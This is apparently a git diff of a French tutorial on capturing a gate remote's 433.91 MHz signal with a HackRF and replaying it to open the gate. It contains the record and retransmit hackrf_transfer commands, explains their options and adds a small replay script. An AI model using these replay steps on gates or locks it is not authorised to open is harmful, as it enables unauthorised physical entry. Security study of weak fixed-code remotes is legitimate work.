@@ -89,8 +89,23 @@ Une fois sur notre fréquence lorsque nous activons la télecommand nous apperce
 ![Scan](https://user-images.githubusercontent.com/39098396/79851629-e0b55e80-83c5-11ea-8a63-2675dcfc38d9.png)
 
 Nous avons donc maintenant une fréquence précise. (433.910000 Mhz)
-Passons ensuite à l'enregistrement : 
-``` hackrf_transfer -s 2 -f 433910000 -r open  ``` 
-provoquer le signal pendant l'enregistrement 
-``` hackrf_transfer -s 2 -f 433910000 -t open -a 1 -x 24  ``` 
-puis réinvoquer le signal devant le portail pour l'ouvrir
+Passons ensuite à l'enregistrement :   
+``` hackrf_transfer -s 2 -f 433910000 -r open  ```   
+provoquer le signal pendant l'enregistrement   
+``` hackrf_transfer -s 2 -f 433910000 -t open -a 1 -x 24  ```   
+puis réinvoquer le signal devant le portail pour l'ouvrir  
+options  utilisées 
+- s : 
+- f : 
+- r : Nom du fichier ou va etre stocké notre signal 
+- t : Nom du fichier ou va etre lu notre signal (afin de le retransmettre)
+- a : Amplifier le signal
+- x : le gain entre 0 et 47 dB (en Décibel)
+
+On peut crée un script pour plus de proffesionalisme : 
+
+```
+figlet Sesame, Ouvre toi ! 
+hackrf_transfer -s 2 -f 433910000 -t open -a 1 -x 24
+figlet C'est ouvert !  
+```   
